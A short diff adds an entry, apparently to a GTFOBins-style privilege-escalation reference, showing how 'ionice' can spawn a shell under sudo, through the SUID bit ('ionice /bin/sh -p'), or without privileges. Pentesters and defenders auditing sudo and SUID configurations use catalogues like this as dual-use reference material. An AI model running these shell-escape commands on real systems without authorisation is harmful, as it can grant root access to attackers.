@@ -1,0 +1,14 @@
+ionice
+======
+
+Shell
+-----
+
+[Sudo]
+    ionice /bin/sh
+
+[SUID]
+    ionice /bin/sh -p
+
+[Unprivileged]
+    ionice /bin/sh
